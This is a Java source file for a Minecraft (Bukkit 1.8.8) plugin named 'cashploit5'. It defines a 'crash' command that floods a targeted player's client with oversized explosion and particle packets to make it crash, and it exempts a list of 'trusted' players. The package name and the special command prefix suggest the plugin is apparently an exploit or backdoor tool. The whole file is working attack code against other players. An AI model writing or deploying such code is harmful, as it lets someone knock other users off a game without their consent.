package de.cashploit5.v1_8_8.command;

import java.util.ArrayList;

import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import de.cashploit5.Main;
import de.cashploit5.v1_8_8.uuidmanager.UUIDManager;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_8_R3.Vec3D;

public class CrashCommand extends Command {

	public CrashCommand() {
		super("crash");
	}

	@Override
	public void onCommand(Player p, Command command, String[] args) {
		if(args.length == 1) {
			Player target = UUIDManager.getPlayer(args[0]);
			if(target == null) {
				Main.sendMessage(p, "§cDieser Spieler ist nicht online!");
			} else {
				if(TrustCommand.getTrustedPlayers().contains(target.getUniqueId().toString())) {
					Main.sendMessage(p, "§cDu kannst diesen Spieler nicht crashen!");
					return;
				}
				((CraftPlayer)target).getHandle().playerConnection.sendPacket(
						new PacketPlayOutExplosion(
						p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), 
						10, new ArrayList<>(), new Vec3D(
						p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ())));
				((CraftPlayer)target).getHandle().playerConnection.sendPacket(
						new PacketPlayOutWorldParticles(
						EnumParticle.PORTAL, true, 0F, 0F, 0F, 0F, 0F, 0F, 0F, Integer.MAX_VALUE, new int[] { 
						Integer.MAX_VALUE }));
				Main.sendMessage(p, "§aSpieler §6" + target.getName() + " §awird gecrasht �?�");
			}
		} else if(args.length == 2) {
			Player target = UUIDManager.getPlayer(args[0]);
			if(target == null) {
				Main.sendMessage(p, "§cDieser Spieler ist nicht online!");
			} else {
				if(TrustCommand.getTrustedPlayers().contains(target.getUniqueId().toString())) {
					Main.sendMessage(p, "§cDu kannst diesen Spieler nicht crashen!");
					return;
				}
				if(args[1].equalsIgnoreCase("partikel")) {
					// Crashen mit Partikel
					((CraftPlayer)target).getHandle().playerConnection.sendPacket(
							new PacketPlayOutWorldParticles(
							EnumParticle.PORTAL, true, 0F, 0F, 0F, 0F, 0F, 0F, 0F, Integer.MAX_VALUE, new int[] { 
							Integer.MAX_VALUE }));
					
					Main.sendMessage(p, "§aSpieler §6" + target.getName() + " §awird gecrasht �?�");
				} else if(args[1].equalsIgnoreCase("explosion")) {
					// Crashen mit Explosion
					for(int i = 0; i < 100000; i++)
					((CraftPlayer)target).getHandle().playerConnection.sendPacket(
							new PacketPlayOutExplosion(
							p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), 
							Integer.MAX_VALUE, new ArrayList<>(), new Vec3D(
							p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ())));
					
					Main.sendMessage(p, "§aSpieler §6" + target.getName() + " §awird gecrasht �?�");
				} else {
					Main.sendMessage(p, "§cBitte benutze §6°crash §c<§6Spieler§c> [<§6partikel§c,§6explosion§c>]");
				}
			}
		} else {
			p.sendMessage("§cBitte benutze §6°crash §c<§6Spieler§c> [<§6partikel§c,§6explosion§c>]");
		}
	}

}
